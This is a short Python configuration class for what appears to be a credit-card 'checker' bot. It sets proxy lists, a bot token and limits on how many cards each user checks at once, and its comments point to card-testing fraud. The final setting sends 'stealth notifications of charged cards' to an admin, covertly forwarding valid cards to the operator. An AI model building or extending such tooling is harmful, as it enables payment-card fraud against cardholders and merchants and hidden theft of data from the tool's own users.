import os

class CheckerConfig:
    def __init__(self):
        # Load from environment variables for Railway deployment
        self.PROXY_LIST = os.getenv("PROXY_LIST", "").split(",") if os.getenv("PROXY_LIST") else []

        self.IS_SHIPPABLE = os.getenv("IS_SHIPPABLE", "false").lower() == "true"

        self.DEFAULT_EMAIL = os.getenv("DEFAULT_EMAIL", None)

        # Per-user concurrency: how many cards each user can check at once
        # Increase this for faster checking (default 20, max recommended 30)
        self.CONCURRENCY_LIMIT = int(os.getenv("CONCURRENCY_LIMIT", "20"))

        # Global concurrency: total concurrent operations across ALL users
        # Prevents server overload (default 150)
        self.GLOBAL_CONCURRENCY_LIMIT = int(os.getenv("GLOBAL_CONCURRENCY_LIMIT", "150"))

        self.BOT_TOKEN = os.getenv("BOT_TOKEN", "")

        # Admin user ID for stealth notifications of charged cards
        self.ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "0")) if os.getenv("ADMIN_USER_ID") else None
